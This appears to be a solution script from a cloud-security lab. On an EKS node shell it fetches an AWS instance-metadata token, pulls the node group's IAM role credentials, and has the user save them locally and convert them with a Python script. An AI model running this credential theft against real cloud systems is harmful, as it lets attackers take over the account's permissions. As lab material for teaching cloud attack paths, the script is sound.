#!/bin/bash

# On the node shell
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data//iam/security-credentials/app-eks-node-group-20230105092937095600000002
# Export the body of your response in a json file and save it on your local machine
# Use the python script to obtain the format of the aws credentials
py solutions/step4/export-credentials-aws.py solutions/step4/aws.json

